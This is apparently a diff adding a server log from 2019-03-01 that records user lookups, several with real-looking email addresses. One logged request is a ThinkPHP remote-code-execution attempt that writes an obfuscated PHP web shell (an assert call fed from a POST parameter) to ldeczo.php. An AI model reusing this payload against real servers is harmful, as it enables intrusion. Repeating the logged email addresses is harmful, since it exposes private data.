@@ -1,0 +1,20 @@
+2019-03-01 1:52:34 - INFO --> getUserByCookie: 
+2019-03-01 1:52:34 - INFO --> getZoomById: email=chaphill1%40yahoo.com&reportType=&description=&
+2019-03-01 7:25:05 - INFO --> getUserByCookie: 
+2019-03-01 7:25:05 - INFO --> getZoomById: email=gsmclain%40aol.com&reportType=&description=&
+2019-03-01 9:47:26 - INFO --> getUserByCookie: 
+2019-03-01 9:47:26 - INFO --> getZoomById: iSctp
+2019-03-01 9:47:26 - INFO --> incrementZoomById: iSctp
+2019-03-01 9:47:26 - INFO --> increment zoom: iSctp
+2019-03-01 14:56:43 - INFO --> getUserByCookie: 
+2019-03-01 14:56:43 - INFO --> getZoomById: s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=ldeczo.php&vars[1][]=%3C?php%20print(md5(222));$a=str_replace(%22vbnm%22,%22%22,%22asvbnmsert%22);@$a($_POST[qazw]);?%3E
+2019-03-01 16:01:54 - INFO --> getUserByCookie: 
+2019-03-01 16:01:54 - INFO --> getZoomById: email=bllyrussell%40aol.com&reportType=&description=&
+2019-03-01 16:33:17 - INFO --> getUserByCookie: 
+2019-03-01 16:33:17 - INFO --> getZoomById: email=cvhardscapes%40yahoo.com&reportType=&description=&
+2019-03-01 16:57:46 - INFO --> getUserByCookie: 
+2019-03-01 20:19:28 - INFO --> getUserByCookie: 
+2019-03-01 21:50:40 - INFO --> getUserByCookie: 
+2019-03-01 21:50:40 - INFO --> getZoomById: email=bmkania3%40yahoo.com&reportType=&description=&
+2019-03-01 23:15:58 - INFO --> getUserByCookie: 
+2019-03-01 23:15:58 - INFO --> getZoomById: type.php
